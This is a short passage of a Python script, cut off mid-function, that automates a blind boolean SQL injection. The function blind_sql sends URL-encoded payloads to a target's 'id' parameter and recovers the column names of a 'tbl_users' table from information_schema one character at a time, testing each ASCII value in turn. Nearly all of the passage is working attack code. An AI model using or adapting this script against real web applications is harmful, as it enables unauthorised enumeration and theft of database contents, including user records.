...
def blind_sql(base, cookies, ok):
    print("--Blind SQLi on progress for all databases--")
    version_data = ""
    response = ""
    col = 1
    iterate = list(range(1,256))
    while True:
        found = False
        for number in iterate:
            url = base + "?id=1%27%20and%20(ASCII(substring((select%20group_concat(column_name,%200x0a)%20from%20information_schema.columns%20where%20table_name=%27tbl_users%27)," + str(col) + ",1))=" + str(number) + ")%20and%20%271%27=%271"
            #print("URL" + url)
            try:
